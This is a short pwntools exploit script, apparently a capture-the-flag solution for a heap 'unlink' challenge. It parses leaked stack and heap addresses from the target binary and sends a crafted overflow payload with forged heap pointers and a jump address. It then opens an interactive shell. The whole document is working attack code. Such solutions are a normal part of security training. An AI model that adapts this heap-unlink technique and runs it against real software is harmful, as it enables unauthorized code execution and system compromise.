from pwn import *
import re

p = process('/home/unlink/unlink')
m = p.recvline()
print m
stack_leak = int(re.findall('0x([0-9a-fA-F]+)', m)[0], 16)
m = p.recvline()
print m
heap_leak = int(re.findall('0x([0-9a-fA-F]+)', m)[0], 16)
print p.recvline()
print 'stack_leak is ' + str(stack_leak) + ' . heap_leak is ' + str(heap_leak)
output = 0x10 * 'A' + p32(heap_leak + 0x24) + p32(stack_leak + 0x10) + p32(0x080484eb)
#print output
p.send(output)
p.interactive()
